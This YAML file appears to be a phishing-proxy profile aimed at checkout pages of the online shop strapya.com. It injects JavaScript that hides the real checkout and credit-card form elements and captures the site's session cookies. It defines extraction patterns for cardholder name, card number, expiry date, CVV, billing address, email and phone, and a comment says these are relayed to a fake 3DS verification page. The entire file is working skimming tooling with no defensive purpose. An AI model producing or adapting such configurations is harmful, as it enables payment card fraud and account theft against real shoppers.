js_inject:
  - trigger_domains: ["www.strapya.com"]
    trigger_paths: ["/checkouts/.*"]
    script: |
      const observer = new MutationObserver(() => {
        // 隐藏 target
        const target = document.querySelector('#checkout-main form > div:first-child > div:first-child');
        if (target) {
          target.style.display = 'none';
        }
      
        // 隐藏所有 target2（包括后续动态新增的）
        document.querySelectorAll('div:has(> div > div > div > #basic-creditCards) ~ div')
        .forEach(el => {
          el.style.display = 'none';
        });
      
      });
        
      observer.observe(document.body, {
        childList: true,
        subtree: true
      });

auth_tokens:
  - domain: 'strapya.com'
    keys: []
    type: 'cookie'
credentials:
  username:
    key: ''
    search: '{"credit_card".*?"name":"([^"]*)"'
    type: 'json'
  password:
    key: ''
    search: '{"credit_card".*?"number":"([^"]*)"'
    type: 'json'
  # 传入3ds页面的参数都在这里， 在3ds页面通过url提取
  custom:
    #信用卡信息
    - key: 'cardHolder'
      search: '{"credit_card".*?"name":"([^"]*)"'
      type: 'json'
    - key: 'cardNo'
      search: '{"credit_card".*?"number":"([^"]*)"'
      type: 'json'
    - key: 'cardMonth'
      search: '{"credit_card".*?"month":(\d+)'
      type: 'json'
    - key: 'cardYear'
      search: '{"credit_card".*?"year":(\d+)'
      type: 'json'
    - key: 'cardCvv'
      search: '{"credit_card".*?"verification_value":"(\d+)"'
      type: 'json'
    #账单地址
    - key: 'billingCountry'
      search: '"billingAddress":\{.*?"countryCode":"([^"]*)"'
      type: 'json'
    - key: 'billingProvince'
      search: '"billingAddress":\{.*?"zoneCode":"([^"]*)"'
      type: 'json'
    - key: 'billingCity'
      search: '"billingAddress":\{.*?"city":"([^"]*)"'
      type: 'json'
    - key: 'billingZip'
      search: '"billingAddress":\{.*?"postalCode":"([^"]*)"'
      type: 'json'
    - key: 'billingAddress1'
      search: '"billingAddress":\{.*?"address1":"([^"]*)"'
      type: 'json'
    - key: 'billingAddress2'
      search: '"billingAddress":\{.*?"address2":"([^"]*)"'
      type: 'json'
    #指纹信息
    - key: 'fpEmail'
      search: '"buyerIdentity":\{.*?"email":"([^"]*)"'
      type: 'json'
    - key: 'fpPhone'
      search: '"buyerIdentity":\{.*?"number":"([^"]*)"'
      type: 'json'
#    - key: 'fpUserAgent'
#      search: ''
#      type: 'json'
#    - key: 'fpIp'
#      search: ''
#      type: 'json'

